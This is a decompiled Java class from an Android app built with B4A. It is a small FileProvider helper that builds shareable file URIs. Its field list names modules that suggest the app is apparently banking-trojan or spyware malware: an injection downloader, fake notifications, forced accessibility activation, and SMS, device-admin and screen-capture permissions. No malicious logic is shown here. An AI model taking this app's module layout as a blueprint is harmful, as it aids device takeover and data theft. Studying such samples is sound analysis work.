package com.com.androidrr;

import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Bit;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.RuntimePermissions;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.reflect.Method;
import java.util.HashMap;

/* loaded from: classes.dex */
public class fileprovider extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public String _sharedfolder = "";
    public boolean _usefileprovider = false;
    public RuntimePermissions _rp = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.fileprovider");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", fileprovider.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public String _class_globals() throws Exception {
        this._sharedfolder = "";
        this._usefileprovider = false;
        this._rp = new RuntimePermissions();
        return "";
    }

    public Object _getfileuri(String str) throws Exception {
        if (!this._usefileprovider) {
            JavaObject InitializeStatic = new JavaObject().InitializeStatic("android.net.Uri");
            StringBuilder sb = new StringBuilder();
            sb.append("file://");
            File file = Common.File;
            sb.append(File.Combine(this._sharedfolder, str));
            return InitializeStatic.RunMethod("parse", new Object[]{sb.toString()});
        }
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeNewInstance("java.io.File", new Object[]{this._sharedfolder, str});
        JavaObject javaObject2 = new JavaObject();
        JavaObject javaObject3 = new JavaObject();
        javaObject3.InitializeContext(this.f268ba);
        javaObject2.InitializeStatic("androidx.core.content.FileProvider");
        StringBuilder sb2 = new StringBuilder();
        B4AApplication b4AApplication = Common.Application;
        sb2.append(B4AApplication.getPackageName());
        sb2.append(".provider");
        return javaObject2.RunMethod("getUriForFile", new Object[]{javaObject3.getObject(), sb2.toString(), javaObject.getObject()});
    }

    public String _initialize(BA BA) throws Exception {
        innerInitialize(BA);
        new Phone();
        if (Phone.getSdkVersion() < 24) {
            File file = Common.File;
            if (File.getExternalWritable()) {
                this._usefileprovider = false;
                this._sharedfolder = this._rp.GetSafeDirDefaultExternal("shared");
                return "";
            }
        }
        this._usefileprovider = true;
        File file2 = Common.File;
        File file3 = Common.File;
        this._sharedfolder = File.Combine(File.getDirInternal(), "shared");
        File file4 = Common.File;
        File.MakeDir("", this._sharedfolder);
        return "";
    }

    public String _setfileuriasintentdata(IntentWrapper intentWrapper, String str) throws Exception {
        new JavaObject();
        ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), intentWrapper.getObject())).RunMethod("setData", new Object[]{_getfileuri(str)});
        Bit bit = Common.Bit;
        intentWrapper.setFlags(Bit.m182Or(intentWrapper.getFlags(), 1));
        return "";
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
